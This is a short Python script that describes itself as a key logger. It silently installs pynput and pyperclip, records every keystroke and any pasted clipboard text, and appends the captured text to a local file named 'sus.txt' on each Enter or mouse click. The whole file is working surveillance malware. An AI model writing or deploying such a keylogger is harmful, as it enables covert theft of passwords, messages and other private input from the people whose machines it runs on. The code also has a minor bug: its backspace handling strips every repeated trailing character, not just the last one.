# check if libiraries are installed if not install them
import sys
import subprocess
import pkg_resources

required = {'pynput', 'pyperclip'}
installed = {pkg.key for pkg in pkg_resources.working_set}
missing = required - installed

if missing:
    python = sys.executable
    subprocess.check_call(
        [python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)

# key logger logic
from pynput.keyboard import Controller
from threading import Lock
import pyperclip
import time
from pynput import keyboard, mouse

word = ""
lock = Lock()


def writeInFile(s):
    file = open("sus.txt", 'a')
    lock.acquire()
    try:
        file.write(s)
    except:
        print("Why r u still here")
    lock.release()
    file.close()


def handleKey(key):
    print(key)
    global word
    if hasattr(key, "char"):
        if key.char == '\x03' or key.char == '\x13' or key.char == '\x01' or key.char == '\x18':
            # skip
            print("ctrl chars skipped")
        elif key.char == '\x16':
            # clipboard checking
            print("ctrl + v")
            try:
                time.sleep(0.2)
                data = pyperclip.paste()
            except:
                print("failled to open clipboard")
            if isinstance(data, str):
                word += str(data)
        else:
            word += key.char
    elif key == keyboard.Key.backspace and len(word) > 0:
        word = word.rstrip(word[-1])
    elif key == keyboard.Key.space and len(word) != 0:
        word += ' '
    elif key == keyboard.Key.enter and len(word) != 0:
        writeInFile(word+'\n')
        print(word)
        word = ""


def handleClick(x, y, button, pressed):
    global word
    if button == mouse.Button.left and pressed == 0 and len(word) != 0:
        writeInFile(word+'\n')
        print(word)
        word = ""


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=handleKey)
    listener.start()
    listener2 = mouse.Listener(on_click=handleClick)
    listener2.start()
    input()
